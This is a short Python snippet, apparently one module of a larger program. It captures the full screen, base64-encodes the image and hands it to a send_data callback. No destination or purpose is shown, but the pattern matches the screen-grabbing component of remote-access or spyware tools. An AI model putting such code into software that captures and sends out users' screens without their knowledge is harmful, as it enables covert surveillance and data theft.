from PIL import ImageGrab
import io
import base64

def capture_screenshot(send_data):
    screenshot = ImageGrab.grab()
    
    # Save screenshot to a buffer
    buffer = io.BytesIO()
    screenshot.save(buffer, format="PNG")
    
    # Encode image in base64
    img_str = base64.b64encode(buffer.getvalue()).decode()
    
    # Send the screenshot
    send_data({"screenshot": img_str})
